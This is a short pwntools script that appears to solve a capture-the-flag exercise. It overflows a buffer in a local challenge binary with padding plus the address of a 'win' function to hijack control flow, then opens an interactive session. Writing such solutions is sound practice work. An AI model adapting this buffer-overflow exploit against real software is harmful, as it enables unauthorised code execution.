from pwn import *

elf = ELF('./chall')
io = process(elf.path)

def choice(n):
    io.sendlineafter(b'Enter your choice: ', n)

choice(b'2')
payload = b'a' * 0x20
payload += p64(elf.symbols['win'])
io.sendlineafter(b'Data for buffer: ', payload)
choice(b'4')

io.interactive()
